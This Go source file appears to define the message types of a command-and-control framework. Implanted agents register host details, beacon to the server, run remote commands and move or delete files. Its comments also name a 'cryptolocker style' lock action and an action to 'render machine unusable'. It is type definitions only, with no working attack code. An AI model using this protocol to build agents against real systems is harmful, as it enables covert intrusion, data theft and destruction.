package types

// Responses
const (
	// StzResponseError to return as error
	StzResponseError = "STZ_ERROR"
	// StzResponseOk to return as ok
	StzResponseOk = "STZ_OK"
)

// Actions
const (
	// StzActionCallback to return the callbacks
	StzActionCallback = "STZ_CALLBACK"
	// StzActionSet to change values for agents
	StzActionSet = "STZ_SET"
	// StzActionGet to get files from agents
	StzActionGet = "STZ_GET"
	// StzActionRegister to register agents
	StzActionRegister = "STZ_REGISTER"
	// StzActionExecute to execute commands in agents
	StzActionExecute = "STZ_EXECUTE"
	// StzActionPut to put files in agents
	StzActionPut = "STZ_PUT"
	// StzActionDelete to delete files in agents
	StzActionDelete = "STZ_DELETE"
	// StzActionUpdate to update an agent
	StzActionUpdate = "STZ_UPDATE"
	// StzActionLock to lock an agent
	StzActionLock = "STZ_LOCK"
	// StzActionSleep to make an agent dormant
	StzActionSleep = "STZ_SLEEP"
	// StzActionExit to kill an active agent
	StzActionExit = "STZ_EXIT"
)

// Status
const (
	// StzStatusNew
	StzStatusNew = "STZ_NEW"
	// StzStatusDone
	StzStatusDone = "STZ_DONE"
	// StzStatusReceived
	StzStatusReceived = "STZ_RECEIVED"
	// StzStatusBeacon
	StzStatusBeacon = "STZ_BEACON"
	// StzStatusError
	StzStatusError = "STZ_ERROR"
)

// StzCallback for methods to communicate with C2
type StzCallback struct {
	ID        uint              `json:"id"`
	Host      string            `json:"host"`
	Port      string            `json:"port"`
	Protocol  string            `json:"protocol"`
	Endpoints map[string]string `json:"endpoints"`
}

// StzCallbacksRequest to request all the callbacks to use
type StzCallbacksRequest struct {
	UUID           string `json:"uuid"`
	HelloThisIsDog string `json:"hellothisisdog"`
}

// StzCallbacksResponse to deliver all the callbacks to use
type StzCallbacksResponse struct {
	Callbacks []StzCallback `json:"callbacks"`
}

// StzRegistrationRequest to register a host in the C2
type StzRegistrationRequest struct {
	UUID     string   `json:"uuid"`
	Hostname string   `json:"hostname"`
	IPs      []string `json:"ips"`
	Uname    string   `json:"uname"`
	GOOS     string   `json:"goos"`
	GOARCH   string   `json:"goarch"`
	Username string   `json:"username"`
	CycleMin int      `json:"cyclemin"`
	CycleMax int      `json:"cyclemax"`
}

// StzRegistrationResponse to confirm registration response from C2
// Confirmation can be:
//   - STZ_OK 				: Registration was successful
//   - STZ_ERROR 		: Registration failed, do it again
type StzRegistrationResponse struct {
	Response string `json:"response"`
}

// StzBeaconStatus to send status info to C2
// Status can be:
//   - STZ_BEACON 		: Just a beacon
type StzBeaconStatus struct {
	Status   string `json:"status"`
	UUID     string `json:"uuid"`
	CycleNow int    `json:"cyclenow"`
}

// StzBeaconResponse to receive standard responses from C2
// Actions can be:
//   - STZ_NONE			: Keep doing the same, no changes
//   - STZ_REGISTER  : Register the agent again
//   - STZ_SET				: Set the value provided in the payload
//   - STZ_EXECUTE 	: Run the command in the payload
//   - STZ_PUT  			: Download file into the host
//   - STZ_GET  			: Get file from the host
//   - STZ_DELETE    : Delete file from host
//   - STZ_LOCK		  : Lock the system, cryptolocker style
//   - STZ_SLEEP		  : Go into silent mode, use payload for sleeping time
//   - STZ_EXIT		  : Stop agent
//   - STZ_DESTROY   : Render machine unusable
type StzBeaconResponse struct {
	Action  string `json:"action"`
	Payload string `json:"payload"`
	ID      uint   `json:"id"`
}

// StzExecutionStatus to update info to C2
// Status can be:
//   - STZ_RECEIVED	:	Confirm received command to execute
//   - STZ_DONE			:	Finalized command with results in the data
type StzExecutionStatus struct {
	Status string `json:"status"`
	UUID   string `json:"uuid"`
	ID     uint   `json:"id"`
	Data   string `json:"data"`
}

// StzFileRequest to receive files from agents
type StzFileRequest struct {
	ID           uint   `json:"id"`
	UUID         string `json:"uuid"`
	Fullname     string `json:"fullname"`
	MD5          string `json:"md5"`
	Size         int64  `json:"size"`
	B64Data      string `json:"data"`
}

// StzFileResponse to confirm received file from C2
// Confirmation can be:
//   - STZ_OK 				: Registration was successful
//   - STZ_ERROR 		: Registration failed, do it again
type StzFileResponse struct {
	Response string `json:"response"`
}
